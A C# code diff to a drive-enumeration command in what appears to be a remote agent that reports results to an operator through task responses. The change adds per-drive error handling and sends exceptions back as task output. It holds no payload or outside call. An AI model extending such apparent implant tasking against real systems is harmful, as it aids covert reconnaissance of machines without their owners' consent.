@@ -25,11 +25,18 @@ namespace Agent
                 StringBuilder sb = new StringBuilder();
                 foreach(var drive in drives)
                 {
-                    dynamic dyn = new System.Dynamic.ExpandoObject();
-                    dyn.DriveName = drive.Name;
-                    dyn.DriveType = drive.DriveType;
-                    dyn.FreeSpace = drive.TotalFreeSpace/1000000000;
-                    dyn.TotalSpace = drive.TotalSize / 1000000000;
+                    try
+                    {
+                        dynamic dyn = new System.Dynamic.ExpandoObject();
+                        dyn.DriveName = drive.Name;
+                        dyn.DriveType = drive.DriveType;
+                        dyn.FreeSpace = drive.TotalFreeSpace / 1000000000;
+                        dyn.TotalSpace = drive.TotalSize / 1000000000;
+                        driveInfo.Add(dyn);
+                    }
+                    catch (Exception e)
+                    {
+                    }
                     //dyn.TotalFreeSpace = drive.TotalFreeSpace / 1000000000;
                     //dyn.TotalSize = drive.TotalSize;
                     //dyn.VolumeLabel = drive.VolumeLabel;
@@ -37,7 +44,6 @@ namespace Agent
                     //dyn.RootDirectory = drive.RootDirectory;
                     //dyn.DriveFormat = drive.DriveFormat;
                     //dyn.AvailableFreeSpace = drive.AvailableFreeSpace;
-                    driveInfo.Add(dyn);
                 }
 
                 string output = JsonSerializer.Serialize(driveInfo);
@@ -50,7 +56,12 @@ namespace Agent
             }
             catch (Exception e)
             {
-                logger.Log(e.ToString());
+                await messageManager.AddResponse(new ResponseResult()
+                {
+                    task_id = job.task.id,
+                    user_output = e.ToString(),
+                    completed = true
+                });
             }
         }
     }
